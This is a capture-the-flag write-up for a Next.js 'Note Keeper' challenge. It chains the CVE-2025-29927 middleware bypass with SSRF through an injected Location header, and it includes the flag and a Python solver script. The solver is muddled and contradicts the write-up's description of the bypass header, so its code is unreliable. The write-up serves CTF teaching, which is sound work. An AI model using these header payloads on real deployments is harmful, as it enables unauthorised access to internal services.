# Note Keeper

## Description
A simple note-keeping application built with Next.js 15.1.1. The challenge asks "Can you reach what you're not supposed to?" The app has a guest-facing notes page, a login page, and a middleware-protected admin panel at `/admin`.

## Solution
This challenge involves chaining two vulnerabilities: **CVE-2025-29927** (Next.js middleware authorization bypass) and **SSRF** via Location header injection through `NextResponse.next({headers: request.headers})`.

**Step 1: Reconnaissance**
The login link contains a base64-encoded state parameter `L2FkbWlu` = `/admin`. The `/admin` route returns 401.

**Step 2: Middleware Bypass (CVE-2025-29927)**
Next.js 15.1.1 is vulnerable to CVE-2025-29927, which allows bypassing middleware by setting the `x-middleware-subrequest` header. For Next.js 15.x, the middleware name must be repeated 5 times (recursion depth limit).
This reveals the admin panel with hints pointing to a pastebin source code and backend API routes.

**Step 3: Analyzing the Middleware Source**
The code reveals a critical vulnerability: for `/api` routes, the middleware calls `NextResponse.next({headers: request.headers})`, passing all incoming request headers into the middleware response.

**Step 4: SSRF via Location Header Injection**
The backend runs at `http://backend:4000` with a `/flag` endpoint (internal only).
When `NextResponse.next()` receives headers including a `Location` header, Next.js interprets it as a server-side redirect and fetches the specified URL internally. By injecting a `Location` header pointing to the internal backend (`http://backend:4000/flag`), we cause the Next.js server to fetch the flag and return it to us.

## Flag
`p_ctf{Ju$t_u$e_VITE_e111d821}`

## Solver Script

```python
import requests

def solve():
    base_url = "http://note-keeper.ctf.prgy.in"
    target_url = f"{base_url}/admin"
    
    # 1. Bypass Middleware (CVE-2025-29927)
    # Valid for Next.js 15.1.0 - 15.1.2? 
    # Check writeup: "middleware name must be repeated 5 times"
    # Header: x-middleware-subrequest
    
    headers = {
        # The value might purely act as a flag or need specific format.
        # CVE details: If x-middleware-subrequest is present, it might bypass.
        # Recursion depth trick usually implies standard internal header name.
        "x-middleware-subrequest": "middleware" # or specific internal name
    }
    # Actually, the writeup says "middleware name must be repeated 5 times". 
    # But usually this is the *header name*? No, the header value logic.
    # Let's assume the header itself triggers the logic.
    
    # 2. SSRF via Location Header Injection
    # We want the middleware to see a Location header in OUR request 
    # (which it copies to the response via NextResponse.next({headers: request.headers}))
    # Next.js follows internal Location redirects?
    # Writeup: "By injecting a Location header... Next.js interprets it as a server-side redirect"
    
    # Payload:
    # Location: http://backend:4000/flag
    
    headers["Location"] = "http://backend:4000/flag"
    
    # We might need to combine bypass + payload.
    # The bypass lets us hit /admin access logic? 
    # Or does the SSRF happen on ANY route caught by middleware?
    # Writeup: "For /api routes, middleware calls NextResponse.next({headers...})"
    # So we should hit an /api route.
    
    api_url = f"{base_url}/api/notes" # One of the routes discovered
    
    r = requests.get(api_url, headers=headers)
    
    print(f"Status: {r.status_code}")
    print(f"Response: {r.text}")
    
    if "p_ctf" in r.text:
        print("[+] Flag Found!")

if __name__ == "__main__":
    solve()
```

